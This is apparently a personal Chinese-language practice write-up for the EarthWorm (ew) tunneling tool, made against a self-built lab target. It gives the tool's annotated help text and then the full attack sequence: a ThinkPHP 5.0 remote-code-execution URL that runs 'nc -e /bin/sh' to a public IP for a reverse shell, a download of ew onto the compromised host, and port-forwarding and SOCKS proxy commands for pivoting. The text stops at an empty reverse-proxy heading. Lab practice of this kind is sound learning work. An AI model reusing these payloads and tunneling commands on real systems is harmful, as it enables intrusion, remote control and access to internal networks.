
# - -help 
```
VERSION : free 1.0 
 ./xxx ([-options] [values])*
 options :
 Eg: ./xxx -s ssocksd -h 
 -s state setup the function.You can pick one from the 
 following options:
 ssocksd , rcsocks , rssocks , 
 lcx_listen , lcx_tran , lcx_slave
 # -s 选项选择连接模式，除了lcx的三种模式还有ssocksd正向SOCKS V5服务器、（rcsocks(公网监听转发主机)、rssocks（目标主机））反弹SOCKS V5服务器。
 -l listenport open a port for the service startup.#监听端口(公网向外转发的端口)
 -d refhost set the reflection host address.#设置反射主机地址（公网IP）
 -e refport set the reflection port.#设置转发到的端口(公网接收端口)
 -f connhost set the connect host address .#设置连接主机地址（参考lcx的h2）要把这台内网主机的流量转发到公网上
 -g connport set the connect port.#设置要转发出去的端口（参考lcx的p2）
 -h help show the help text, By adding the -s parameter,
 you can also see the more detailed help.# 可以使用 ./ew -s [ssocksd|rcsocks|rssocks|lcx_listen|lcx_tran|lcx_slave]等获取关于具体模式的帮助
 -a about show the about pages # 显示关于
 -v version show the version. #显示版本
 -t usectime set the milliseconds for timeout. The default 
 value is 1000 #忙猜设置超时时间，默认1000  英语不好也可以猜
 ......
```

# 参考教程敲一遍（做个小模拟渗透）
**注：** 
- 攻击机位于我的笔记本上的kali nat联网 ip：192.168.153.133
- 被攻击的是校内我搭建的靶机 ip:10.203.87.64  环境：tp5.0
- 公网主机：45.\*.\*.190
## 做个小模拟渗透
利用命令执行弹shell
  
这次用NC弹shell
http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nc%20-e%20/bin/sh%2045.76.101.190%201235


公网服务器上面监听：
nc -l -p 1235
下载ew
wget -p /tmp http://45.\*.\*.190/ew_for_linux
chmod +x ew_for_linux

## 使用lcx相关的功能
### 将肉鸡的22端口或者内网中的10.203.87.61的80端口转发到公网上8888端口
`./ew_for_Linux32 -s lcx_slave -d 45.*.*.190 -e 2222 -f 127.0.0.1 -g 6522`

> 第一次用就出了一个问题
```
[root@localhost 45.*.*.190]# ./ew_for_Linux32 -s lcx_slave -d 45.*.*.190 -e 2222 -f 127.0.0.1 -g 6522
-bash: ./ew_for_linux: /lib/ld-linux.so.2: bad ELF interpreter: 没有那个文件或目录
```
> 解决方案到肉鸡上：yum install glibc.i686，那么如果肉鸡上没有安装权限可能就要换工具了

### 公网服务器监听端口转发8888
`./ew_for_Linux32 -s lcx_listen -l 443 -e 2222`


> 中间遇到的小插曲不知道为什么就是用不了 ssh抓包 握手成功了  请求也发出去了  就是没有相应 也不断开连接，从1.0换到1.2也不行，感觉像是防火墙的问题，但是使用lcx却连接上了，同样的端口ew就不行，一切连接都显示正常，就是不回包

# 直接测试socks代理吧还是

## 打开正向socks V5代理(好像多了一种用工作室的网的方式)
./ew_for_linux -s ssocksd -l 1080

## 反向代理
